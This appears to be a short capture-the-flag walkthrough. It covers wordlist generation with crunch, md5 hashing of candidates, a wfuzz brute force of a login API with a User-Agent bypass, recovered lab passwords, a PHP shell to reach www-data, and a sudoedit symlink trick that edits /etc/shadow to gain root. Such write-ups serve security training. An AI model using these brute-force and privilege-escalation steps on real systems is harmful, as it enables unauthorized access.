only ssh and web open, possible user "marco"
checking /login.php, we see a password policy, for memorable words we use "savoia","curtis", and the other plane.

use `crunch 9 9 -t savoia%%^` and same with other names, to generate wordlist and use `subl`(ctrl+shift+L) to select all
and lower and upper-case everything, we also need to hash the passwords with md5 as seen in the md5.src.js, we can use this:

`while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' ' | tee -a hash_pass.txt; done < pass.tx`

now using hydra gives error and using FUZZ doesn't give a valid result, we had to check the requests and adjust the user-agent.

`wfuzz -w hashed-list -H "User-Agent: Bypass" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://<machine-ip>/api/login --hh 63`
we get a valid response and crack the hash to get the password.(`savoia21!`)

the web login looks promising but was a rabbit hole :/
ssh into marco and check /var/www and we see a "admin.db"(accessible only by www-data), we use a php shell to get to www-data and
read the hash of the other user from the db(use su `Donald1983$`)

checking `sudo -l` shows sudoedit on a /var/www/html/*/*/config.php file, we symlink /etc/shadow to a file under 
`/var/www/html/root/root/config.php` and use `sudoedit -u root /var/www/html/*/*/config.php` to read and edit the file to get root.

